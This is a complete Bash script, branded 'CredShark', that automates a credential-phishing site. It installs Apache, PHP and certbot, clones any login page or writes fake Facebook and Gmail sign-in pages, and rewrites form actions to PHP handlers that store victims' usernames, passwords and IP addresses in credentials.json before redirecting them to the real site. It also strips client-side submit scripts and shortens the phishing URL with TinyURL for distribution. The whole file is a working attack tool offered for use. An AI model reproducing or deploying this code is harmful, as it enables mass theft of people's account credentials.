#!/bin/bash

RED='\e[31m'
GREEN='\e[32m'
YELLOW='\e[33m'
BLUE='\e[34m'
MAGENTA='\e[35m'
CYAN='\e[36m'
BOLD='\e[1m'
ENDCOLOR='\e[0m' 
echo -e "${CYAN}"
echo "╔═════════════════════════════════════════════════════════════════════════════╗"
echo "║                                                                             ║"
echo "║   ██████╗██████╗ ███████╗██████╗ ███████╗██╗  ██╗ █████╗ ██████╗ ██╗  ██╗   ║"
echo "║  ██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝██║  ██║██╔══██╗██╔══██╗██║ ██╔╝   ║"
echo "║  ██║     ██████╔╝█████╗  ██║  ██║███████╗███████║███████║██████╔╝█████╔╝    ║"
echo "║  ██║     ██╔══██╗██╔══╝  ██║  ██║╚════██║██╔══██║██╔══██║██╔══██╗██╔═██╗    ║"
echo "║  ╚██████╗██║  ██║███████╗██████╔╝███████║██║  ██║██║  ██║██║  ██║██║  ██╗   ║"
echo "║   ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ║"
echo "║                                                                             ║"
echo "║                        By: Michael Pritsert                                 ║"
echo "║                                                                             ║"
echo "╚═════════════════════════════════════════════════════════════════════════════╝"
echo -e "${ENDCOLOR}"


if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}${BOLD}[!] This script must be run as root${ENDCOLOR}"
  exit 
fi

function TOOLS() # checks for required tools
{
echo -e "${YELLOW}${BOLD}[*]${ENDCOLOR}${BOLD} Checking for required tools${ENDCOLOR}"
echo
for tool in wget apache2 certbot php ; do
	if command -v "$tool" >/dev/null; then
		echo -e "${BOLD}$tool: ${GREEN}Installed${ENDCOLOR}"
	else
		echo -e "${BOLD}$tool: ${RED}NOT installed${ENDCOLOR}${BOLD}, installing now...${ENDCOLOR}"
	case "$tool" in
				wget)
				sudo apt-get update && sudo apt-get install -y wget
				;;
				apache2)
				sudo apt-get update && sudo apt-get install -y apache2
				;;
				certbot)
				sudo apt-get update && sudo apt-get install -y certbot
				;;
				php)
				sudo apt-get update && sudo apt-get install -y php
				;;
	esac	
	fi
done
}		

function CONF()
{
echo
echo -ne "${YELLOW}[*]${ENDCOLOR}${BOLD} Do you have a custom domain? (Y/N) ${ENDCOLOR}"
while true; do
read -r domain
echo
case $domain in
	y|Y)
		echo -e "${YELLOW}[*]${ENDCOLOR}${BOLD} Please enter your domain name:${ENDCOLOR}"
		read -r domain_name
		echo
		echo -e "${YELLOW}[*]${ENDCOLOR}${BOLD} Configuring apache to $domain_name${ENDCOLOR}"
		sed -i "s/ServerName .*/ServerName $domain_name/" /etc/apache2/sites-available/000-default.conf &> /dev/null
		systemctl reload apache2
		echo
		echo -e "${YELLOW}[*]${ENDCOLOR}${BOLD} Starting SSL configuration via Certbot${ENDCOLOR}"
		certbot --apache -d "$domain_name" --non-interactive --agree-tos --register-unsafely-without-email &> /dev/null
		if [ $? -eq 0 ]
		then
			echo
			echo -e "[*] SSL certificate configuration - ${GREEN}Successful${ENDCOLOR}"
			echo
			target_url="https://$domain_name"
			echo -e "${YELLOW}[*]${ENDCOLOR}${BOLD} Your phishing site will run on: ${RED}$target_url${ENDCOLOR}"
		else
			echo
			echo -e "${YELLOW}[!]${ENDCOLOR}${BOLD} SSL certificate configuration - ${RED}Unsuccessful${ENDCOLOR}"
			echo
			echo -e "${YELLOW}[*]${ENDCOLOR}${BOLD} Defaulting to local domain${ENDCOLOR}"
			local=$(hostname -I | awk '{print $1}')
			service apache2 restart
			port=$(netstat -antp | grep -E 'apache2|80' | grep -o "80" | head -n 1)
			if [ "$port" == "80" ]; then
				target_url="http://$local"
				echo
				echo -e "${YELLOW}[*]${ENDCOLOR}${BOLD} Your phishing site will run on: ${RED}$target_url${ENDCOLOR}"
			fi
		fi
		break
	;;
	n|N)
		echo -e "${YELLOW}[*]${ENDCOLOR}${BOLD} Defaulting to local domain${ENDCOLOR}"
		local=$(hostname -I | awk '{print $1}')
		service apache2 restart
		port=$(netstat -antp | grep -E 'apache2|80' | grep -o "80" | head -n 1)
		if [ "$port" == "80" ]; then
			target_url="http://$local"
			echo -e "${YELLOW}[*]${ENDCOLOR}${BOLD} Your phishing site will run on: ${RED}$target_url${ENDCOLOR}"
		else
			echo -e "${BOLD}[!] Apache2 configuration on port 80 - ${RED}Unsuccesful${ENDCOLOR}"
			echo -e "${BOLD}[*]${RED} Exiting${ENDCOLOR}"
			exit
		fi
		break
	;;
	*)
		echo -e "${RED}[!] Invalid input${ENDCOLOR}"
		echo -e "${RED}[*] Choose from the available options${ENDCOLOR}"
		echo -e "${RED}[*] Y | N${ENDCOLOR}"
		echo
	;;
esac
done

}

function METHOD() # choose between a built-in template, or a custom one
{
echo
echo -e "${YELLOW}[*]${ENDCOLOR} ${BOLD}Choose the desired phishing method:${ENDCOLOR}"
while true; do
echo "[1] Clone a website (requires entering the full URL)"
echo "[2] Use a built-in template (Facebook / Gmail)"
echo -ne "${BOLD}Choice: ${ENDCOLOR}"
read -r method
case "$method" in
	1) CLONE ; break ;;
	2) BUILTIN_MENU ; break ;;
	*)
		echo -e "${RED}[!] Invalid input${ENDCOLOR}"
		echo -e "${RED}[*] Choose from the available options${ENDCOLOR}"
		echo
	;;
esac	
done
}

function CLONE()
{
echo
echo -e "${BOLD}[*] Chosen method: ${RED}CLONE${ENDCOLOR}"
echo
echo -e "${YELLOW}[*]${ENDCOLOR} Please enter the full URL of the website to clone"
while true; do
	while true; do
	read -r website
	echo
	check_url=$(echo "$website" | awk -F: '{print $1}')
	if [ "$check_url" == "http" ] || [ "$check_url" == "https" ]; then
		echo -e "${BOLD}[*] This URL is ${GREEN}valid${ENDCOLOR}"
		break
	else
		echo -e "${BOLD}[!] This URL is ${RED}not valid${ENDCOLOR}"
		echo -e "${BOLD}[!] Please enter a valid URL or exit${ENDCOLOR}"
	fi
	done
echo
echo -e "${BOLD}[*] Starting cloning process"
echo
echo -e "${BOLD}[T] The target URL is: ${YELLOW}$website${ENDCOLOR}"
echo
echo -e "${BOLD}[*] The cloned HTML document will be saved at ${YELLOW}/var/log/index.html${ENDCOLOR}"
echo
useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
if wget --user-agent="$useragent" --no-check-certificate "$website" -O /var/www/html/index.html &> /dev/null; then
	echo -e "${BOLD}[*] Website cloning - ${GREEN}Succesfull${ENDCOLOR}"
else
	echo -e "${BOLD}[*] Website cloning - ${RED}Unsuccesfull${ENDCOLOR}"
	echo -e "${BOLD}[*] Please enter another URL${ENDCOLOR}"
	continue
fi
echo
echo -e "${BOLD}[*] Analyzing HTML dosument"
echo
username_field=$(grep -Eio '<input[^>]+name="[^"]*(user|email|login)[^"]*"' /var/www/html/index.html | grep -oP 'name="\K[^"]+')
password_field=$(grep -iP 'type="password"' /var/www/html/index.html | grep -oP 'name="\K[^"]+')
if [ -z "$username_field" ] || [ -z "$password_field" ]; then
	echo -e "${BOLD}[!] HTML document analysis - ${RED}Unsuccesfull${ENDCOLOR}"
	echo -e "${BOLD}[*] Please enter another URL${ENDCOLOR}"
	continue
else
	echo -e "${BOLD}[*] HTML document analysis - ${GREEN}Succesful${ENDCOLOR}"
fi
echo
echo -e "${BOLD}[*] Configuring custom PHP file${ENDCOLOR}"
	main_domain=$(echo "$website" | cut -d'/' -f1-3)
cat << EOF > /var/www/html/custom.php
<?php
    \$file = "credentials.json";
    \$user = \$_POST["$username_field"];
    \$pass = \$_POST["$password_field"];
    \$ip = \$_SERVER['REMOTE_ADDR'];
    \$time = date("Y-m-d H:i:s");
    \$domain = "$main_domain";
    \$log_entry = ["time" => \$time, "ip" => \$ip, "user" => \$user, "pass" => \$pass];
    \$data = file_exists(\$file) ? json_decode(file_get_contents(\$file), true) : [];
    \$data[] = \$log_entry;
    file_put_contents(\$file, json_encode(\$data, JSON_PRETTY_PRINT));
    header("Location: \$domain");
    exit();
?>
EOF
echo
echo -e "${BOLD}[*] Custom PHP File configuration - ${GREEN}Complete${ENDCOLOR}"
echo
local_host=$(hostname -I | awk '{print $1}')
final_target="http://$local_host/custom.php"
echo -e "${BOLD}[*] Redirecting HTML form action to ${YELLOW}$final_target${ENDCOLOR}"
sed -i "s|action=\"[^\"]*\"|action=\"$final_target\"|g" /var/www/html/index.html
echo
echo -e "${BOLD}[*] Neutralizing client-side encryption/scripts${ENDCOLOR}"
sed -i "s|onsubmit=\"[^\"]*\"||g" /var/www/html/index.html
echo
echo -e "${BOLD}[*] Operation - ${GREEN}Complete${ENDCOLOR}"
echo
echo -e "${BOLD}[*] Initiating JSON file creation for credentials capturing${ENDCOLOR}"
echo "[]" > /var/www/html/credentials.json
chown www-data:www-data /var/www/html/credentials.json /var/www/html/custom.php
chmod 664 /var/www/html/credentials.json
echo
echo -e "${BOLD}[*] JSON file creation - ${GREEN}Complete${ENDCOLOR}"
break
done
}

function BUILTIN_MENU()
{
echo
echo -e "${BOLD}[*] Chosen method: ${RED}BUILT-IN TEMPLATE${ENDCOLOR}"	
echo
echo -e "${BOLD}[*] Please choose the desired template${ENDCOLOR}"
while true; do
echo -e "[1]${BOLD} Facebook${ENDCOLOR}"
echo -e "[2]${BOLD} Gmail${ENDCOLOR}"
echo -ne "${BOLD}Choice: ${ENDCOLOR}"
read -r template	
case $template in
	1) FACEBOOK	; break ;;
	2) GMAIL	; break ;;
	*)
		echo -e "${RED}[!] Invalid input${ENDCOLOR}"
		echo -e "${RED}[*] Choose from the available options${ENDCOLOR}"
		echo
	;;
esac

done
	
}

function FACEBOOK()
{
echo
echo -e "${BOLD}[*] Chosen template: ${RED}FACEBOOK${ENDCOLOR}"
echo
echo -e "${BOLD}[*] Template creation proccess initialized${ENDCOLOR}"
cat << 'EOF' > /var/www/html/index.html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook</title>

<style>
:root{
  --blue:#1877F2;
  --bg:#f3f4f6;
  --card:#ffffff;
  --line:#dcdfe4;
}

*{box-sizing:border-box;}

body{
  margin:0;
  font-family: Helvetica, Arial, sans-serif;
  background:var(--bg);
  min-height:100vh;
  position:relative;
}

/* Top-left circle */
.logo{
  position:absolute;
  top:30px;
  left:30px;
  width:80px;
  height:80px;
  border-radius:50%;
  background:var(--blue);
  display:flex;
  align-items:center;
  justify-content:center;
}

.logo span{
  color:white;
  font-size:56px;
  font-weight:900;
}

/* Layout */
.wrapper{
  display:flex;
  justify-content:space-between;
  align-items:center;
  padding:0 120px;
  min-height:100vh;
}

.left{
  flex:1;
  display:flex;
  justify-content:center;
}

.big-box{
  width:750px;
  height:360px;
  background:var(--blue);
  border-radius:70px;
  display:flex;
  align-items:center;
  justify-content:center;
  transform:translateY(-40px);
}

.big-box h1{
  color:white;
  font-size:120px;
  margin:0;
  font-weight:900;
  letter-spacing:-2px;
}

/* Right side */
.right{
  width:400px;
}

.login-card{
  background:var(--card);
  border-radius:14px;
  padding:24px;
  box-shadow:0 6px 25px rgba(0,0,0,0.08);
}

/* Form styling */
form input{
  width:100%;
  height:54px;
  border-radius:12px;
  border:1px solid var(--line);
  padding:0 16px;
  font-size:16px;
  margin-bottom:14px;
  outline:none;
}

form input:focus{
  border-color:var(--blue);
  box-shadow:0 0 0 3px rgba(24,119,242,0.15);
}

form button[type="submit"]{
  width:100%;
  height:50px;
  border:none;
  border-radius:999px;
  background:var(--blue);
  color:white;
  font-size:16px;
  font-weight:700;
  cursor:pointer;
}

.forgot{
  text-align:center;
  margin:14px 0;
  font-size:14px;
  color:var(--blue);
  cursor:pointer;
}

.divider{
  height:1px;
  background:var(--line);
  margin:16px 0;
}

.btn-outline{
  width:100%;
  height:46px;
  border-radius:999px;
  border:2px solid var(--blue);
  background:white;
  color:var(--blue);
  font-weight:700;
  cursor:pointer;
}
</style>
</head>
<body>

<div class="logo"><span>f</span></div>

<div class="wrapper">
  <div class="left">
    <div class="big-box">
      <h1>facebook</h1>
    </div>
  </div>

  <div class="right">
    <div class="login-card">

      <form action="facebook.php" method="post">
        <input type="text" name="email" placeholder="Email address" required>
        <input type="password" name="pass" placeholder="Password" required>
        <button type="submit">Login</button>
        <div class="forgot">Forgot password?</div>
        <div class="divider"></div>
        <button class="btn-outline" type="button">Create account</button>
      </form>

    </div>
  </div>
</div>

</body>
</html>
EOF
echo
echo -e "${BOLD}[*] Configuring custom PHP file${ENDCOLOR}"
 cat << EOF > /var/www/html/facebook.php
<?php
\$file = "credentials.json";
\$user = \$_POST["email"];
\$pass = \$_POST["pass"];
\$ip = \$_SERVER['REMOTE_ADDR'];
\$time = date("Y-m-d H:i:s");
\$domain = "https://www.facebook.com";

\$log_entry = ["time" => \$time, "ip" => \$ip, "user" => \$user, "pass" => \$pass, "platform" => "Facebook"];
\$data = file_exists(\$file) ? json_decode(file_get_contents(\$file), true) : [];
\$data[] = \$log_entry;

file_put_contents(\$file, json_encode(\$data, JSON_PRETTY_PRINT));
header("Location: \$domain");
exit();
?>
EOF
echo
echo -e "${BOLD}[*] ${GREEN}Finished${ENDCOLOR}"
}

function GMAIL()
{
echo
echo -e "${BOLD}[*] Chosen template: ${RED}GMAIL${ENDCOLOR}"
echo
echo -e "${BOLD}[*] Template creation proccess initialized"${ENDCOLOR}
cat << 'EOF' > /var/www/html/index.html
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Sign In</title>

<style>
:root{
  --bg:#f2f4f8;
  --card:#ffffff;
  --line:#e6e9ef;
  --text:#111827;
  --muted:#6b7280;
  --primary:#1877F2;
}

*{ box-sizing:border-box; }

body{
  margin:0;
  min-height:100vh;
  font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
  background: var(--bg);
  display:flex;
  align-items:center;
  justify-content:center;
  padding:28px;
  color:var(--text);
}

.card{
  width:min(1050px,100%);
  background:var(--card);
  border:1px solid var(--line);
  border-radius:14px;
  box-shadow:0 12px 40px rgba(17,24,39,0.06);
  padding:40px;
  position:relative;
  min-height:500px;
}

/* Header (top-left) */
.header{
  position:absolute;
  top:40px;
  left:40px;
}


/* SVG sizing */
.logo-circle svg{
  width:40px;
  height:40px;
  display:block;
}

.header-title{
  font-size:28px;
  font-weight:800;
  margin-bottom:6px;
}

.header-sub{
  font-size:16px;
  color:var(--muted);
}

/* Center form lower */
.panel{
  display:flex;
  justify-content:center;
  padding-top:180px;
}

form{
  text-align:center;
}

.field{
  width:340px;
  height:42px;
  border:1px solid var(--line);
  border-radius:8px;
  padding:0 12px;
  font-size:14px;
  outline:none;
  margin-bottom:14px;
  display:block;
}

.field:focus{
  border-color:rgba(24,119,242,0.6);
  box-shadow:0 0 0 4px rgba(24,119,242,0.12);
}

.btn{
  height:38px;
  padding:0 28px;
  border:0;
  border-radius:8px;
  background:var(--primary);
  color:#fff;
  font-weight:700;
  cursor:pointer;
}

.btn:hover{ filter:brightness(0.98); }
</style>
</head>

<body>
<div class="card">
  <div class="header">
    <div class="logo-circle">
      <!-- Your SVG goes here (fixed + valid) -->
      <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48" aria-hidden="true">
        <path fill="#4285F4" d="M46.1 24.5c0-1.7-.2-3.3-.5-4.9H24v9.3h12.4c-.5 2.9-2.1 5.4-4.6 7.1v5.9h7.4c4.3-4.1 6.9-10.1 6.9-17.4z"/>
        <path fill="#34A853" d="M24 46c6.2 0 11.4-2 15.2-5.5l-7.4-5.9c-2 1.4-4.6 2.2-7.8 2.2-6 0-11-4-12.8-9.5H3.6v6.1C7.6 40.2 15.2 46 24 46z"/>
        <path fill="#FBBC05" d="M11.2 27c-.5-1.4-.8-2.8-.8-4.4s.3-3 .8-4.4v-6.1H3.6C2 15.3 1.1 19.6 1.1 24s.9 8.7 2.5 12.3l7.6-6.1z"/>
        <path fill="#EA4335" d="M24 10.7c3.4 0 6.4 1.2 8.8 3.4l6.6-6.6C35.4 3.9 30.2 2 24 2 15.2 2 7.6 7.8 3.6 14.6l7.6 6.1c1.8-5.5 6.8-10 12.8-10z"/>
      </svg>
    </div>
    <div class="header-title">Sign in</div>
    <div class="header-sub">to continue</div>
  </div>

  <div class="panel">
    <form action="gmail.php" method="post">
      <input class="field" type="text" name="email" placeholder="Email address" required>
      <input class="field" type="password" name="pass" placeholder="Password" required>
      <button class="btn" type="submit">Login</button>
    </form>
  </div>
</div>
</body>
</html>
EOF
	
echo
echo -e "${BOLD}[*] Configuring custom PHP file${ENDCOLOR}"
 cat << EOF > /var/www/html/gmail.php
<?php
\$file = "credentials.json";
\$user = \$_POST["email"];
\$pass = \$_POST["pass"];
\$ip = \$_SERVER['REMOTE_ADDR'];
\$time = date("Y-m-d H:i:s");
\$domain = "https://www.gmail.com";

\$log_entry = ["time" => \$time, "ip" => \$ip, "user" => \$user, "pass" => \$pass, "platform" => "Gmail"];
\$data = file_exists(\$file) ? json_decode(file_get_contents(\$file), true) : [];
\$data[] = \$log_entry;

file_put_contents(\$file, json_encode(\$data, JSON_PRETTY_PRINT));
header("Location: \$domain");
exit();
?>
EOF
echo
echo -e "${BOLD}[*] ${GREEN}Finished${ENDCOLOR}"
}

TOOLS
CONF
METHOD

echo
echo -e "${BOLD}[*] Generating public short URL${ENDCOLOR}"
echo
short_url=$(curl -s https://tinyurl.com/api-create.php?url=$target_url)
echo -e "${BOLD}${GREEN}------------------------------------------------------------------------${ENDCOLOR}"
echo -e "${BOLD}[*] SETUP COMPLETE"
echo -e "[*] Original URL: $target_url"
echo -e "[*] Shortened URL: $short_url" 
echo -e "[*] Captured credentials will be saved in: /var/www/html/credentials.json${ENDCOLOR}"
echo -e "${BOLD}${GREEN}-------------------------------------------------------------------------${ENDCOLOR}"
